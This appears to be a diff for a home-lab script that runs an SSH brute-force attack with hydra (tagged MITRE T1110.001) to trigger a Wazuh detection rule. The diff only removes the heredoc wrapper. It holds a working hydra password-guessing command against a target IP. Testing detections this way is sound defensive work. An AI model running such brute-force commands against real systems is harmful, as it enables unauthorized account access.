@@ -1,4 +1,3 @@
-cat > scripts/attacks/ssh_bruteforce.sh << 'EOF'
 #!/bin/bash
 # Attack: SSH Brute Force
 # MITRE: T1110.001
@@ -25,5 +24,3 @@ hydra -l "$TARGET_USER" -P "$WORDLIST" -t 4 -f ssh://$TARGET_IP 2>/dev/null || t
 
 echo "[+] Done. Check Wazuh dashboard: https://192.168.8.129"
 echo "[+] Filter: rule.id:100001"
-EOF
-chmod +x scripts/attacks/ssh_bruteforce.sh
